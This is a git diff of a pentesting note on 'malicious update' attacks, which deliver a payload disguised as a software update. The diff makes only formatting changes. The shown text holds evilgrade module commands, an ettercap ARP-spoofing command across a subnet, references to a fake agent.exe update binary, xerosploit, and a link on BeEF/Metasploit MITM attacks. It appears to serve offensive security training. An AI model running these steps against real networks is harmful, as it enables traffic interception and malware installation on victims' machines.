@@ -1,4 +1,4 @@
-# Malicious Update
+# ⭕ Malicious Update
 
 #### Presenting the victim with a malicious payload as a software update package.
 
@@ -51,7 +51,7 @@ evilgrade>conf sunjava
 evilgrade(sunjava)>
 ```
 
-#### Show all VirtualHosts.&#x20;
+#### Show all VirtualHosts.
 
 VirtualHost field contains the domains that our webserver is going to emulate for us.
 
@@ -59,7 +59,7 @@ VirtualHost field contains the domains that our webserver is going to emulate fo
 evilgrade>show vhosts
 ```
 
-#### Show options of current module.&#x20;
+#### Show options of current module.
 
 **agent:** This is our fake update binary, we have to set the path to where it's located or implement a dynamic fake update binary generation (see ADVANCED).
 
@@ -92,7 +92,7 @@ sudo ettercap -YqM arp:remote /10.10.10.1-254// /10.10.10.1-254//
 Evilgrade delivers malicious code with local web server
 
 {% hint style="info" %}
-Default is agent.exe in isr-evilgrade/agent directory.&#x20;
+Default is agent.exe in isr-evilgrade/agent directory.
 
 Replace this file (Notepad clone) or change the "agent" parameter in the module.
 {% endhint %}
@@ -111,7 +111,6 @@ The LHOST argument used by the attacker can be set to a specific IP address to l
 evilgrade
 evilgrade> conf notepadplus
 evilgrade(notepadplus)>show options
-
 ```
 
 ![](<../../.gitbook/assets/image (296) (1) (1) (1).png>)
@@ -170,4 +169,3 @@ sudo xerosploit
 ## Combine with BeFF and Metasploit
 
 {% embed url="https://sploitech.com/exploiting-tools/how-to-do-advanced-mitm-attacks-with-beef-xerosploit" %}
-
